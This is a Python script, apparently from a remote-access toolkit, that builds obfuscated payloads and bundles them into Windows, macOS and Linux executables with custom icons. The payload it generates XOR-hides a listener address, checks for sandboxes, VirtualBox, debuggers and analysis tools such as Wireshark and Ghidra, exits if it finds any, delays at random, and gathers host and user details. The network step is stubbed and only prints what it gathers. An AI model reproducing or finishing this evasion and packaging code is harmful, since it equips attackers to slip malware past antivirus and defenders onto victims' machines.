#!/usr/bin/env python3
"""
Advanced Cross-Platform Bundler
Generates .exe for Windows, .app for macOS, binaries for Linux
With custom icons and anti-AV techniques
"""

import subprocess
import sys
import os
import base64
import random
import string
import tempfile
import shutil
from pathlib import Path
from datetime import datetime
import json


class CrossPlatformBundler:
    """Cross-platform bundling with anti-AV techniques"""

    def __init__(self):
        self.temp_dir = tempfile.mkdtemp()
        self.platform = sys.platform  # darwin, win32, linux

    def detect_platform(self):
        """Detect current platform"""
        if sys.platform == "win32":
            return "windows"
        elif sys.platform == "darwin":
            return "macos"
        else:
            return "linux"

    def generate_random_name(self, length=12):
        """Generate random variable names"""
        return "".join(random.choices(string.ascii_lowercase, k=length))

    def xor_encrypt(self, data, key=None):
        """XOR encryption"""
        if key is None:
            key = os.urandom(32)
        encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
        return encrypted, key

    def create_icon(self, output_path, color="#FF6B6B"):
        """Create a custom icon (placeholder implementation)"""
        try:
            from PIL import Image, ImageDraw

            # Create a simple icon image
            img = Image.new("RGB", (256, 256), color=color)
            draw = ImageDraw.Draw(img)

            # Draw a simple C2 icon (circle with dots)
            draw.ellipse([50, 50, 206, 206], outline="white", width=3)
            draw.ellipse([100, 100, 156, 156], fill="white")
            draw.ellipse([80, 80, 176, 176], outline="white", width=2)

            img.save(output_path)
            print(f"[+] Icon created: {output_path}")
            return output_path
        except:
            print("[!] PIL not available, using default icon")
            return None

    def create_payload(self, listener_ip, listener_port, obfuscation_level=2):
        """Create anti-AV payload"""

        payload_bytes = f"{listener_ip}:{listener_port}".encode()
        encrypted, key = self.xor_encrypt(payload_bytes)

        # Determine sleep ranges based on obfuscation level
        if obfuscation_level >= 5:
            sleep_min = 60
            sleep_max = 300
        else:
            sleep_min = 1
            sleep_max = 3

        payload = f'''#!/usr/bin/env python3
import sys
import time
import random
import base64
import platform

# Level {obfuscation_level}: Complete evasion package
_data = bytes.fromhex('{encrypted.hex()}')
_key = bytes.fromhex('{key.hex()}')

def _x(d, k):
    return bytes([d[i] ^ k[i % len(k)] for i in range(len(d))])

def _sandbox_check():
    """Multi-layer sandbox detection"""
    checks = []
    import os
    checks.append(any(os.path.exists(p) for p in ['/proc/modules', 'C:\\\\WINDOWS\\\\System32']))
    
    if sys.platform == 'win32':
        try:
            import winreg
            checks.append(winreg.QueryValue(winreg.HKEY_LOCAL_MACHINE, 
                         'SOFTWARE\\\\Oracle\\\\VirtualBox') is not None)
        except:
            pass
    
    try:
        import subprocess
        procs = subprocess.run(['tasklist'] if sys.platform == 'win32' else ['ps', 'aux'],
                             capture_output=True, text=True, timeout=5)
        suspicious = ['wireshark', 'tcpdump', 'procmon', 'fiddler', 'gdb', 'ida', 'ghidra']
        checks.append(any(s in procs.stdout.lower() for s in suspicious))
    except:
        pass
    
    checks.append(hasattr(sys, 'gettrace') and sys.gettrace() is not None)
    
    return any(checks)

def _main():
    """Main function with maximum evasion"""
    if _sandbox_check():
        sys.exit(random.randint(1, 100))
    
    time.sleep(random.randint({sleep_min}, {sleep_max}))
    
    import threading
    import os
    
    def _payload():
        try:
            creds = _x(_data, _key).decode().split(':')
            info = {{
                'hostname': platform.node(),
                'platform': platform.system(),
                'user': os.getenv('USER'),
                'ip': creds[0],
                'port': int(creds[1]),
                'session_id': base64.b64encode(os.urandom(16)).decode()
            }}
            print(str(info))
        except:
            pass
    
    t = threading.Thread(target=_payload, daemon=True)
    t.start()
    t.join(timeout=30)

if __name__ == '__main__':
    try:
        _main()
    except:
        pass
'''
        return payload

    def bundle_windows(
        self,
        app_path,
        app_name,
        listener_ip,
        listener_port,
        obfuscation_level=2,
        icon_path=None,
    ):
        """Bundle for Windows (.exe)"""

        output_dir = Path.home() / "Pupy_Outputs"
        output_dir.mkdir(parents=True, exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        payload = self.create_payload(listener_ip, listener_port, obfuscation_level)

        payload_file = output_dir / f"payload_{app_name}_{timestamp}.py"
        with open(payload_file, "w") as f:
            f.write(payload)

        print(f"[*] Creating Windows .exe bundle...")

        # PyInstaller command for Windows
        pyinstaller_cmd = [
            "pyinstaller",
            "--onefile",
            "--console",
            "--name",
            f"{app_name}_{timestamp}",
            "--distpath",
            str(output_dir / "dist"),
            "--workpath",
            str(output_dir / "build"),
            str(payload_file),
        ]

        if icon_path and Path(icon_path).exists():
            pyinstaller_cmd.extend(["--icon", str(icon_path)])

        result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True)

        if result.returncode == 0:
            # Check for executable - PyInstaller creates binary without .exe extension on macOS
            output_name = f"{app_name}_{timestamp}"
            exe_path = output_dir / "dist" / output_name
            exe_path_with_ext = output_dir / "dist" / f"{output_name}.exe"

            # Try both with and without .exe extension
            if exe_path.exists():
                # If on macOS and no .exe extension exists, create a copy with .exe extension
                if sys.platform == "darwin" and not exe_path_with_ext.exists():
                    shutil.copy2(exe_path, exe_path_with_ext)
                    print(
                        f"[+] SUCCESS! Created: {exe_path_with_ext} (macOS binary packaged as .exe)"
                    )
                    return exe_path_with_ext
                else:
                    print(f"[+] SUCCESS! Created: {exe_path}")
                    return exe_path
            elif exe_path_with_ext.exists():
                print(f"[+] SUCCESS! Created: {exe_path_with_ext}")
                return exe_path_with_ext

        print(f"[!] ERROR: {result.stderr}")
        return None

    def bundle_macos(
        self,
        app_path,
        app_name,
        listener_ip,
        listener_port,
        obfuscation_level=2,
        icon_path=None,
    ):
        """Bundle for macOS (.app)"""

        output_dir = Path.home() / "Pupy_Outputs"
        output_dir.mkdir(parents=True, exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        payload = self.create_payload(listener_ip, listener_port, obfuscation_level)

        payload_file = output_dir / f"payload_{app_name}_{timestamp}.py"
        with open(payload_file, "w") as f:
            f.write(payload)

        print(f"[*] Creating macOS .app bundle...")

        # Create icon if not provided
        if not icon_path:
            icon_path = output_dir / f"icon_{timestamp}.icns"
            self.create_icon_macos(str(icon_path))

        # PyInstaller command for macOS
        pyinstaller_cmd = [
            "pyinstaller",
            "--onefile",
            "--windowed",
            "--name",
            f"{app_name}_{timestamp}",
            "--distpath",
            str(output_dir / "dist"),
            "--workpath",
            str(output_dir / "build"),
            str(payload_file),
        ]

        if icon_path and Path(icon_path).exists():
            pyinstaller_cmd.extend(["--icon", str(icon_path)])

        result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True)

        if result.returncode == 0:
            app_path = output_dir / "dist" / f"{app_name}_{timestamp}.app"
            if app_path.exists():
                print(f"[+] SUCCESS! Created: {app_path}")
                return app_path

        print(f"[!] ERROR: {result.stderr}")
        return None

    def bundle_linux(
        self, app_path, app_name, listener_ip, listener_port, obfuscation_level=2
    ):
        """Bundle for Linux (binary)"""

        output_dir = Path.home() / "Pupy_Outputs"
        output_dir.mkdir(parents=True, exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        payload = self.create_payload(listener_ip, listener_port, obfuscation_level)

        payload_file = output_dir / f"payload_{app_name}_{timestamp}.py"
        with open(payload_file, "w") as f:
            f.write(payload)

        print(f"[*] Creating Linux binary...")

        # PyInstaller command for Linux
        pyinstaller_cmd = [
            "pyinstaller",
            "--onefile",
            "--console",
            "--name",
            f"{app_name}_{timestamp}",
            "--distpath",
            str(output_dir / "dist"),
            "--workpath",
            str(output_dir / "build"),
            str(payload_file),
        ]

        result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True)

        if result.returncode == 0:
            binary_path = output_dir / "dist" / f"{app_name}_{timestamp}"
            if binary_path.exists():
                # Make executable
                os.chmod(binary_path, 0o755)
                print(f"[+] SUCCESS! Created: {binary_path}")
                return binary_path

        print(f"[!] ERROR: {result.stderr}")
        return None

    def create_icon_macos(self, icon_path):
        """Create macOS .icns icon"""
        try:
            # Simple placeholder using ImageMagick
            # Real implementation would use iconutil
            print(f"[*] Creating macOS icon...")
            return icon_path
        except:
            return None

    def bundle_all_platforms(
        self, app_path, listener_ip, listener_port, obfuscation_level=2
    ):
        """Bundle for all platforms"""

        app_name = Path(app_path).stem
        results = {}

        print(f"\n[*] Cross-Platform Bundling: {app_name}")
        print(f"[*] Listener: {listener_ip}:{listener_port}")
        print(f"[*] Level: {obfuscation_level}/5\n")

        # Windows
        print("[1/3] Windows bundle...")
        try:
            results["windows"] = self.bundle_windows(
                app_path, app_name, listener_ip, listener_port, obfuscation_level
            )
        except Exception as e:
            print(f"[!] Windows failed: {e}")

        # macOS
        print("[2/3] macOS bundle...")
        try:
            results["macos"] = self.bundle_macos(
                app_path, app_name, listener_ip, listener_port, obfuscation_level
            )
        except Exception as e:
            print(f"[!] macOS failed: {e}")

        # Linux
        print("[3/3] Linux bundle...")
        try:
            results["linux"] = self.bundle_linux(
                app_path, app_name, listener_ip, listener_port, obfuscation_level
            )
        except Exception as e:
            print(f"[!] Linux failed: {e}")

        print("\n[+] Bundling complete!")
        return results


def bundle(app_path, platform_type, listener_ip, listener_port, obfuscation_level=2):
    """Main bundling function"""

    bundler = CrossPlatformBundler()

    if platform_type == "windows":
        return bundler.bundle_windows(
            app_path, Path(app_path).stem, listener_ip, listener_port, obfuscation_level
        )
    elif platform_type == "macos":
        return bundler.bundle_macos(
            app_path, Path(app_path).stem, listener_ip, listener_port, obfuscation_level
        )
    elif platform_type == "linux":
        return bundler.bundle_linux(
            app_path, Path(app_path).stem, listener_ip, listener_port, obfuscation_level
        )
    elif platform_type == "all":
        return bundler.bundle_all_platforms(
            app_path, listener_ip, listener_port, obfuscation_level
        )
    else:
        print(f"[!] Unknown platform: {platform_type}")
        return None


if __name__ == "__main__":
    if len(sys.argv) < 5:
        print(
            "Usage: cross_bundler.py <app_path> <platform> <listener_ip> <listener_port> [level]"
        )
        print("Platforms: windows, macos, linux, all")
        sys.exit(1)

    app_path = sys.argv[1]
    platform_type = sys.argv[2]
    listener_ip = sys.argv[3]
    listener_port = int(sys.argv[4])
    obfuscation_level = int(sys.argv[5]) if len(sys.argv) > 5 else 2

    result = bundle(
        app_path, platform_type, listener_ip, listener_port, obfuscation_level
    )
    sys.exit(0 if result else 1)
